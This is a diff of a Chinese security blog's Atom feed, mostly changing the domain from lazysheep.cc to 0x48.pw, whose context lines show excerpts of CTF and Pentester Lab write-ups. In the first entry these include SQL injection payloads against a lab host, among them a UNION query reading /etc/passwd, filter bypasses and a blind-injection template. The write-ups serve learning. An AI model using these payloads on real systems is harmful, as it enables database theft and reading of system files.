@@ -4,9 +4,9 @@
   <title><![CDATA[Hc1m1]]></title>
   <subtitle><![CDATA[Blog]]></subtitle>
   <link href="/atom.xml" rel="self"/>
-  <link href="http://lazysheep.cc//"/>
-  <updated>2016-03-22T13:41:48.000Z</updated>
-  <id>http://lazysheep.cc//</id>
+  <link href="http://0x48.pw//"/>
+  <updated>2016-03-28T07:55:37.898Z</updated>
+  <id>http://0x48.pw//</id>
   
   <author>
     <name><![CDATA[Hcamael]]></name>
@@ -17,10 +17,10 @@
   
   <entry>
     <title><![CDATA[Pentester Lab Writeup]]></title>
-    <link href="http://lazysheep.cc/2016/03/21/0x15/"/>
-    <id>http://lazysheep.cc/2016/03/21/0x15/</id>
+    <link href="http://0x48.pw/2016/03/21/0x15/"/>
+    <id>http://0x48.pw/2016/03/21/0x15/</id>
     <published>2016-03-21T02:16:46.000Z</published>
-    <updated>2016-03-22T13:41:48.000Z</updated>
+    <updated>2016-03-28T07:55:37.898Z</updated>
     <content type="html"><![CDATA[<p><img src="/img/pent.png" alt="pentest"><br><a id="more"></a><br>玩了下exploit, 再来玩玩pentest。</p>
 <h1 id="SQLI">SQLI</h1><h2 id="Example_1">Example 1</h2><p>没做任何过滤，简单。。不过看了下，mysql的用户没啥权限，所以最多就是查看数据库信息了，没法读系统文件，写文件getshell。。<br>Payload:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/sqli/example1.php?name=admin<span class="number">%27</span><span class="number">%20</span>union<span class="number">%20</span>select<span class="number">%20</span>version(),load_file(<span class="number">%22</span>/etc/passwd<span class="number">%22</span>),user(),4,5<span class="number">%23</span></span><br></pre></td></tr></table></figure></p>
 <h2 id="Example_2">Example 2</h2><p>这题就过滤了空格呗。。也简单。。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.102/sqli/example2.php?name=root%27<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="operator"><span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">version</span>(),<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span>%<span class="number">23</span></span><br><span class="line">http://<span class="number">192.168</span>.56.102/sqli/example2.php?name=root%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>SCHEMA_NAME,<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.SCHEMATA%<span class="number">23</span></span><br><span class="line">http://<span class="number">192.168</span>.56.102/sqli/example2.php?name=root%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>TABLE_NAME,<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.<span class="keyword">TABLES</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=%<span class="number">22</span>exercises%<span class="number">22</span>%<span class="number">23</span></span></span><br></pre></td></tr></table></figure></p>
@@ -32,7 +32,10 @@
 <h2 id="Example_6">Example 6</h2><p>猜到了，这题是要求0-9结尾。。一样简单<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/sqli/example6.php?id=2<span class="number">%20</span>union<span class="number">%20</span>select<span class="number">%20</span>user(),version(),database(),4,5<span class="number">%233</span></span><br></pre></td></tr></table></figure></p>
 <h2 id="Example_7">Example 7</h2><p>这题看了源码。<br>Payload:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/sqli/example7.php?id=2<span class="number">%0</span>aunion<span class="number">%20</span>select<span class="number">%20</span>version(),user(),database(),4,5<span class="number">%23</span></span><br></pre></td></tr></table></figure></p>
 <p>这题需要用%0a来bypass，因为。。看源码：<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="params">(!preg_match<span class="params">('/^-?[<span class="number">0</span>-<span class="number">9</span>]+$/m', $_GET[<span class="string">"id"</span>])</span>)</span> &#123;</span><br><span class="line">		die<span class="params">(<span class="string">"ERROR INTEGER REQUIRED"</span>)</span>;	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
-<p>主要是最后的/m<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">m <span class="comment">(PCRE_MULTILINE)</span></span><br><span class="line">默认情况下，PCRE 认为目标字符串是由单行字符组成的<span class="comment">(然而实际上它可能会包含多行)</span>， <span class="string">"行首"</span>元字符 <span class="comment">(^)</span> 仅匹配字符串的开始位置， 而<span class="string">"行末"</span>元字符 <span class="comment">($)</span> 仅匹配字符串末尾， 或者最后的换行符<span class="comment">(除非设置了 D 修饰符)</span>。这个行为和 perl 相同。 当这个修饰符设置之后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外， 还分别匹配目标字符串的最开始和最末尾位置。这等同于 perl 的 /m 修饰符。如果目标字符串 中没有 <span class="string">"\n"</span> 字符，或者模式中没有出现 ^ 或 $，设置这个修饰符不产生任何影响。</span><br></pre></td></tr></table></figure></p>
+<p>主要是最后的/m</p>
+<blockquote>
+<p>m (PCRE_MULTILINE)<br>默认情况下，PCRE 认为目标字符串是由单行字符组成的(然而实际上它可能会包含多行)， “行首”元字符 (^) 仅匹配字符串的开始位置， 而”行末”元字符 (\$) 仅匹配字符串末尾， 或者最后的换行符(除非设置了 D 修饰符)。这个行为和 perl 相同。当这个修饰符设置之后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外， 还分别匹配目标字符串的最开始和最末尾位置。这等同于 perl 的 /m 修饰符。如果目标字符串 中没有 “\n” 字符，或者模式中没有出现 ^ 或 \$，设置这个修饰符不产生任何影响。</p>
+</blockquote>
 <p>意思就是，加了一个\n后，就会有两行，只要其中一行满足正则匹配就会返回true</p>
 <h2 id="Example_8">Example 8</h2><p>很明显，是在<code>order by</code>的位置注，不过就不能使用union了，所以用布尔盲注。。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">http</span>:<span class="value">//<span class="number">192.168</span>.<span class="number">56.102</span>/sqli/example8.php?order=id`,(select%<span class="number">20</span><span class="function">ascii</span>(<span class="function">substr</span>(<span class="function">user</span>(), [var1],<span class="number">1</span>))=[var2])%<span class="number">23</span></span></span></span><br></pre></td></tr></table></figure></p>
 <p>写个脚本跑这个payload就好了，有两个变量var1和var2，var1是int型表示字符串的几var1位，var2就是跑ascii码，如果页面有显示内容，则表示user()第var1字符的ascii码为var2。</p>
@@ -79,18 +82,18 @@
     
     </summary>
     
-      <category term="Pentest" scheme="http://lazysheep.cc/tags/Pentest/"/>
+      <category term="Pentest" scheme="http://0x48.pw/tags/Pentest/"/>
     
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[0CTF RSA?总结 || RSA学习笔记]]></title>
-    <link href="http://lazysheep.cc/2016/03/17/0x14/"/>
-    <id>http://lazysheep.cc/2016/03/17/0x14/</id>
+    <link href="http://0x48.pw/2016/03/17/0x14/"/>
+    <id>http://0x48.pw/2016/03/17/0x14/</id>
     <published>2016-03-17T01:18:02.000Z</published>
-    <updated>2016-03-19T02:34:18.000Z</updated>
+    <updated>2016-03-19T02:34:18.720Z</updated>
     <content type="html"><![CDATA[<p><img src="/img/rsa.jpg" alt="rsa"><br><a id="more"></a><br><em>果然不是信息安全专业的，只是自学会有很多技能点的缺失。</em><br>该题用的是中国剩余定理，顺便学了一遍RSA，发现了数学技能点的缺失</p>
 <p>(PS: ^表示为次方，xor才是异或，％和mod为求余，/表示为整除)</p>
 <h1 id="RSA学习笔记">RSA学习笔记</h1><p>先来学学前置技能</p>
@@ -174,18 +177,18 @@
     
     </summary>
     
-      <category term="Crypto" scheme="http://lazysheep.cc/tags/Crypto/"/>
+      <category term="Crypto" scheme="http://0x48.pw/tags/Crypto/"/>
     
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[This is AliCTF?]]></title>
-    <link href="http://lazysheep.cc/2016/03/15/0x13/"/>
-    <id>http://lazysheep.cc/2016/03/15/0x13/</id>
+    <link href="http://0x48.pw/2016/03/15/0x13/"/>
+    <id>http://0x48.pw/2016/03/15/0x13/</id>
     <published>2016-03-15T00:35:30.000Z</published>
-    <updated>2016-03-15T03:10:47.000Z</updated>
+    <updated>2016-03-15T03:10:47.933Z</updated>
     <content type="html"><![CDATA[<p><img src="/img/alictf0.png" alt="alictf0"><br><a id="more"></a><br>这算是今年的阿里CTF？昨天小伙伴在玩这个，我在研究0CTF的WEB题，今早知道真相的我眼泪掉下来。上周五刚面了一轮。。。</p>
 <h1 id="Step_0">Step 0</h1><p>上图中的base64解码呗。。<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo <span class="string">"aHR0cDovLzIxOC4yNDQuMTQzLjE5OC8="</span> <span class="string">| base64 -d</span></span><br><span class="line">http:<span class="comment">//218.244.143.198/</span></span><br></pre></td></tr></table></figure></p>
 <p>打开来是一个 伪造？ 的sqlmap网站，右键查看源码， 有一坨jsfuck，太长了，这里就不贴了。。直接丢F12里面的console运行，得到：<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">218.244</span>.143.198<span class="regexp">/.svn/</span></span><br></pre></td></tr></table></figure></p>
@@ -212,16 +215,16 @@
     
     </summary>
     
-      <category term="CTF" scheme="http://lazysheep.cc/tags/CTF/"/>
+      <category term="CTF" scheme="http://0x48.pw/tags/CTF/"/>
     
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[0CTF总结]]></title>
-    <link href="http://lazysheep.cc/2016/03/14/0x12/"/>
-    <id>http://lazysheep.cc/2016/03/14/0x12/</id>
+    <link href="http://0x48.pw/2016/03/14/0x12/"/>
+    <id>http://0x48.pw/2016/03/14/0x12/</id>
     <published>2016-03-14T02:25:27.000Z</published>
     <updated>2016-03-15T10:02:54.000Z</updated>
     <content type="html"><![CDATA[<p><img src="/img/0ctf.png" alt="0ctf"><br><a id="more"></a></p>
@@ -249,18 +252,18 @@
     
     </summary>
     
-      <category term="CTF" scheme="http://lazysheep.cc/tags/CTF/"/>
+      <category term="CTF" scheme="http://0x48.pw/tags/CTF/"/>
     
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[unholy Writeup]]></title>
-    <link href="http://lazysheep.cc/2016/03/07/0x11/"/>
-    <id>http://lazysheep.cc/2016/03/07/0x11/</id>
+    <link href="http://0x48.pw/2016/03/07/0x11/"/>
+    <id>http://0x48.pw/2016/03/07/0x11/</id>
     <published>2016-03-07T02:16:46.000Z</published>
-    <updated>2016-03-14T13:19:21.000Z</updated>
+    <updated>2016-03-14T13:19:21.037Z</updated>
     <content type="html"><![CDATA[<p><img src="/img/re.jpg" alt="re"><br><a id="more"></a></p>
 <p>这周末和小伙伴们一起打BKPCTF，我一个web狗，竟然撸逆向停不下来。。。撸了两个晚上。。。终于撸出来了。。</p>
 <p>unholy这题说是ruby+python，其实我觉得主要还是逆C。。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">main.rb</span><br><span class="line">require_relative 'unholy'</span><br><span class="line">include UnHoly</span><br><span class="line">python_hi</span><br><span class="line">puts ruby_hi</span><br><span class="line">puts "Programming Skills: PRIMARILY RUBY AND PYTHON BUT I CAN <span class="operator"><span class="keyword">USE</span> <span class="keyword">ANY</span> TYPE <span class="keyword">OF</span> GEM <span class="keyword">TO</span> CONTROL <span class="keyword">ANY</span> TYPE <span class="keyword">OF</span> SNAKE<span class="string">"</span><br><span class="line">puts "</span>give me your flag<span class="string">"</span><br><span class="line">flag = gets.chomp!</span><br><span class="line">arr = flag.unpack("</span>V*<span class="string">")</span><br><span class="line">is_key_correct? arr</span></span></span><br></pre></td></tr></table></figure></p>
@@ -281,18 +284,18 @@
     
     </summary>
     
-      <category term="RE" scheme="http://lazysheep.cc/tags/RE/"/>
+      <category term="RE" scheme="http://0x48.pw/tags/RE/"/>
     
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[Nebula Writeup]]></title>
-    <link href="http://lazysheep.cc/2016/02/14/0x0F/"/>
-    <id>http://lazysheep.cc/2016/02/14/0x0F/</id>
+    <link href="http://0x48.pw/2016/02/14/0x0F/"/>
+    <id>http://0x48.pw/2016/02/14/0x0F/</id>
     <published>2016-02-14T02:16:46.000Z</published>
-    <updated>2016-03-11T07:20:45.000Z</updated>
+    <updated>2016-03-11T07:20:45.184Z</updated>
     <content type="html"><![CDATA[<p><img src="/img/exploit.jpg" alt="exploit"><br><a id="more"></a></p>
 <p><em>这份writeup可能水分很大，因为第一次玩这类的题目，所以一边看别人的writeup一边玩才玩的出来，不过还会有自己的总结。</em></p>
 <h1 id="附">附</h1><p>这游戏一开始我是直接在虚拟机中玩，后面发现自己傻的可以，虚拟机中各种不方便，不能粘贴复制之类，没有鼠标etc。</p>
@@ -387,18 +390,18 @@
     
     </summary>
     
-      <category term="PWN" scheme="http://lazysheep.cc/tags/PWN/"/>
+      <category term="PWN" scheme="http://0x48.pw/tags/PWN/"/>
     
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[12.19网络方向培训]]></title>
-    <link href="http://lazysheep.cc/2015/12/19/0x0E/"/>
-    <id>http://lazysheep.cc/2015/12/19/0x0E/</id>
+    <link href="http://0x48.pw/2015/12/19/0x0E/"/>
+    <id>http://0x48.pw/2015/12/19/0x0E/</id>
     <published>2015-12-19T02:36:07.000Z</published>
-    <updated>2015-12-19T10:16:12.000Z</updated>
+    <updated>2015-12-19T10:16:12.109Z</updated>
     <content type="html"><![CDATA[<p><img src="/img/isa.png" alt="ISA"><br><a id="more"></a></p>
 <h1 id="OSI七层模型(Open_System_Interconnect_开放系统互连参考模型)">OSI七层模型(Open System Interconnect 开放系统互连参考模型)</h1><p>国际标准化组织(ISO)和国际电报电话咨询委员会(CCITT)联合制定的开放系统互连参考模型</p>
 <p><img src="/img/osi.jpg" alt="osi"></p>
@@ -437,18 +440,18 @@
     
     </summary>
     
-      <category term="网络" scheme="http://lazysheep.cc/tags/%E7%BD%91%E7%BB%9C/"/>
+      <category term="网络" scheme="http://0x48.pw/tags/%E7%BD%91%E7%BB%9C/"/>
     
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[HCTF之Black-Eat-Black总结]]></title>
-    <link href="http://lazysheep.cc/2015/12/08/0x0D/"/>
-    <id>http://lazysheep.cc/2015/12/08/0x0D/</id>
+    <link href="http://0x48.pw/2015/12/08/0x0D/"/>
+    <id>http://0x48.pw/2015/12/08/0x0D/</id>
     <published>2015-12-08T06:49:13.000Z</published>
-    <updated>2015-12-09T01:36:20.000Z</updated>
+    <updated>2015-12-09T01:36:20.469Z</updated>
     <content type="html"><![CDATA[<p><img src="/img/hctf.png" alt="HCTF"><br><a id="more"></a></p>
 <p>这次HCTF，我负责黑吃黑这题的出题和运维，最终只有六星一个队日穿了该题。</p>
 <hr>
@@ -504,18 +507,18 @@
     
     </summary>
     
-      <category term="CTF" scheme="http://lazysheep.cc/tags/CTF/"/>
+      <category term="CTF" scheme="http://0x48.pw/tags/CTF/"/>
     
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[Python 的 BaseHTTPServer模块分析小结]]></title>
-    <link href="http://lazysheep.cc/2015/12/01/0x0C/"/>
-    <id>http://lazysheep.cc/2015/12/01/0x0C/</id>
+    <link href="http://0x48.pw/2015/12/01/0x0C/"/>
+    <id>http://0x48.pw/2015/12/01/0x0C/</id>
     <published>2015-12-01T05:02:30.000Z</published>
-    <updated>2015-12-01T07:51:36.000Z</updated>
+    <updated>2015-12-01T07:51:36.857Z</updated>
     <content type="html"><![CDATA[<p><img src="/img/python.jpg" alt="Python"><br><a id="more"></a><br>已经好久没更新过博客了，因为最近开始用为知笔记了，感觉每次发到blog的都太零散了，好多都还没完成，所以现在决定，零散的写到笔记里去，然后有一个完整的内容再发到blog里来。</p>
 <p>这次是一篇完整的BaseHTTPServer模块分析，花了几天时间研究该模块，先放上我的思维导图，由于是第一次使用思维导图，所以弄得不是很满意。<br><img src="/img/BaseHTTPServer.jpeg" alt="BaseHTTPServer"></p>
 <p>分析该模块的起因是该反代程序：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> BaseHTTPServer</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CacheHandler</span><span class="params">(BaseHTTPServer.BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">      m = hashlib.md5()</span><br><span class="line">      m.update(self.path)</span><br><span class="line">      cache_filename = m.hexdigest()</span><br><span class="line">      <span class="keyword">if</span> os.path.exists(cache_filename):</span><br><span class="line">          <span class="keyword">print</span> <span class="string">"Cache hit"</span></span><br><span class="line">          data = open(cache_filename).readlines()</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">          <span class="keyword">print</span> <span class="string">"Cache miss"</span></span><br><span class="line">          data = urllib2.urlopen(<span class="string">"http://www.baidu.com"</span> + self.path).readlines()</span><br><span class="line">          open(cache_filename, <span class="string">'wb'</span>).writelines(data)</span><br><span class="line">      self.send_response(<span class="number">200</span>)</span><br><span class="line">      self.end_headers()</span><br><span class="line">      self.wfile.writelines(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    server_address = (<span class="string">''</span>, <span class="number">9999</span>)</span><br><span class="line">    httpd = BaseHTTPServer.HTTPServer(server_address, CacheHandler)</span><br><span class="line">    httpd.serve_forever()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure></p>
@@ -555,18 +558,18 @@
     
     </summary>
     
-      <category term="Python" scheme="http://lazysheep.cc/tags/Python/"/>
+      <category term="Python" scheme="http://0x48.pw/tags/Python/"/>
     
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[10.31新生培训]]></title>
-    <link href="http://lazysheep.cc/2015/10/31/0x0B/"/>
-    <id>http://lazysheep.cc/2015/10/31/0x0B/</id>
+    <link href="http://0x48.pw/2015/10/31/0x0B/"/>
+    <id>http://0x48.pw/2015/10/31/0x0B/</id>
     <published>2015-10-31T13:28:26.000Z</published>
-    <updated>2015-10-31T13:41:04.000Z</updated>
+    <updated>2015-10-31T13:41:04.522Z</updated>
     <content type="html"><![CDATA[<p>10.31新生培训<br><a id="more"></a></p>
 <h2 id="代码的调试之旅_——_Debug">代码的调试之旅 —— Debug</h2><ol>
 <li>VS2015<ul>
@@ -621,16 +624,16 @@
     
     </summary>
     
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[不使用select情况下的各种盲注]]></title>
-    <link href="http://lazysheep.cc/2015/10/05/0x09/"/>
-    <id>http://lazysheep.cc/2015/10/05/0x09/</id>
+    <link href="http://0x48.pw/2015/10/05/0x09/"/>
+    <id>http://0x48.pw/2015/10/05/0x09/</id>
     <published>2015-10-05T03:17:10.000Z</published>
-    <updated>2015-10-15T01:09:09.000Z</updated>
+    <updated>2015-10-15T01:09:09.824Z</updated>
     <content type="html"><![CDATA[<p><img src="/img/sqli.jpg" alt="SQLI"><br><a id="more"></a><br>这次的XDCTF, 关于web1 400, 学到了很多666的姿势, 开一篇新博文, 记录这些姿势..</p>
 <p>原本我以为, 在select被过滤的情况下, 如果不能bypass, 就没法注入… 而这次看了writeup后, 不同的队, 姿势都不同, 大开眼界….</p>
 <p>这次题目的语句我猜测是 <code>select pic from table where ID=&quot;$i&quot;;</code><br>$i 则是可控点..</p>
@@ -644,18 +647,18 @@
     
     </summary>
     
-      <category term="SQLi" scheme="http://lazysheep.cc/tags/SQLi/"/>
+      <category term="SQLi" scheme="http://0x48.pw/tags/SQLi/"/>
     
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[2015XDCTF低分web题writeup]]></title>
-    <link href="http://lazysheep.cc/2015/10/03/0x08/"/>
-    <id>http://lazysheep.cc/2015/10/03/0x08/</id>
+    <link href="http://0x48.pw/2015/10/03/0x08/"/>
+    <id>http://0x48.pw/2015/10/03/0x08/</id>
     <published>2015-10-03T06:11:30.000Z</published>
-    <updated>2015-10-15T01:09:05.000Z</updated>
+    <updated>2015-10-15T01:09:05.489Z</updated>
     <content type="html"><![CDATA[<p><img src="/img/xdctf.png" alt="xdctf"><br><a id="more"></a><br>国庆两天, XDCTF, 质量和难度和上次的NSCTF都不是一个层次的…</p>
 <h2 id="web1_100">web1 100</h2><p><code>index.php~</code> 搞出源码:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">'test'</span>];</span><br><span class="line"><span class="variable">$test</span>=md5(<span class="variable">$test</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$test</span>==<span class="string">'0'</span>) &#123; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"flag&#123;xxxxxx&#125;"</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"you are falied!"</span>; </span><br><span class="line"><span class="keyword">print</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"tips:知道原理了，请不在当先服务器环境下测试，在本地测试好，在此测试poc即可，否则后果自负"</span>; </span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
 <p>这题黑魔法啊!!! 真是学习了<br><code>md5(&#39;240610708&#39;) = 0e462097431906509019562988736854</code><br>而 <code>&#39;0e462097431906509019562988736854&#39; == &#39;0&#39;</code></p>
@@ -674,18 +677,18 @@
     
     </summary>
     
-      <category term="CTF" scheme="http://lazysheep.cc/tags/CTF/"/>
+      <category term="CTF" scheme="http://0x48.pw/tags/CTF/"/>
     
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[WeChall Writeup]]></title>
-    <link href="http://lazysheep.cc/2015/08/07/0x06/"/>
-    <id>http://lazysheep.cc/2015/08/07/0x06/</id>
+    <link href="http://0x48.pw/2015/08/07/0x06/"/>
+    <id>http://0x48.pw/2015/08/07/0x06/</id>
     <published>2015-08-07T09:01:53.000Z</published>
-    <updated>2015-10-15T01:08:56.000Z</updated>
+    <updated>2015-10-15T01:08:56.793Z</updated>
     <content type="html"><![CDATA[<p><img src="/img/wechall.gif" alt="Wechall"><br><a id="more"></a></p>
 <p>年轻人, 要多撸题, 少打炮..</p>
 <h2 id="0x00_No_Escape">0x00 No Escape</h2><p>看源码, 是sql注入.<br>payload: <code>index.php?vote_for=bill</code>=111%23`</p>
@@ -708,18 +711,18 @@
     
     </summary>
     
-      <category term="Wechall" scheme="http://lazysheep.cc/tags/Wechall/"/>
+      <category term="Wechall" scheme="http://0x48.pw/tags/Wechall/"/>
     
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[git小记]]></title>
-    <link href="http://lazysheep.cc/2015/07/22/0x04/"/>
-    <id>http://lazysheep.cc/2015/07/22/0x04/</id>
+    <link href="http://0x48.pw/2015/07/22/0x04/"/>
+    <id>http://0x48.pw/2015/07/22/0x04/</id>
     <published>2015-07-22T12:30:25.000Z</published>
-    <updated>2015-10-15T01:08:20.000Z</updated>
+    <updated>2015-10-15T01:08:20.667Z</updated>
     <content type="html"><![CDATA[<p><img src="/img/git.jpg" alt="GIT"><br><a id="more"></a></p>
 <p>今天用git，把文件上传到服务器，然后下载下来，这些过了一遍。发现，在linux上git是最好用的。。。</p>
 <p>git不像svn一样分服务端客户端，git在linux只需要一句命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install git</span><br></pre></td></tr></table></figure></p>
@@ -759,18 +762,18 @@
     
     </summary>
     
-      <category term="GIT" scheme="http://lazysheep.cc/tags/GIT/"/>
+      <category term="GIT" scheme="http://0x48.pw/tags/GIT/"/>
     
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[对于硬盘事件的随想]]></title>
-    <link href="http://lazysheep.cc/2015/07/19/0x02/"/>
-    <id>http://lazysheep.cc/2015/07/19/0x02/</id>
+    <link href="http://0x48.pw/2015/07/19/0x02/"/>
+    <id>http://0x48.pw/2015/07/19/0x02/</id>
     <published>2015-07-19T14:38:44.000Z</published>
-    <updated>2015-07-19T16:11:10.000Z</updated>
+    <updated>2015-07-19T16:11:10.076Z</updated>
     <content type="html"><![CDATA[<p><img src="/img/brain.jpg" alt="brain"><br><a id="more"></a></p>
 <p>加密最初的目的就是让数据更安全，可是经过这次事件，我认为，加密本身就是一件不安全的事情</p>
 <hr>
@@ -793,18 +796,18 @@
     
     </summary>
     
-      <category term="随笔" scheme="http://lazysheep.cc/tags/%E9%9A%8F%E7%AC%94/"/>
+      <category term="随笔" scheme="http://0x48.pw/tags/%E9%9A%8F%E7%AC%94/"/>
     
-      <category term="S-essay" scheme="http://lazysheep.cc/categories/S-essay/"/>
+      <category term="S-essay" scheme="http://0x48.pw/categories/S-essay/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[对于这次硬盘坏掉事件小记]]></title>
-    <link href="http://lazysheep.cc/2015/07/19/0x01/"/>
-    <id>http://lazysheep.cc/2015/07/19/0x01/</id>
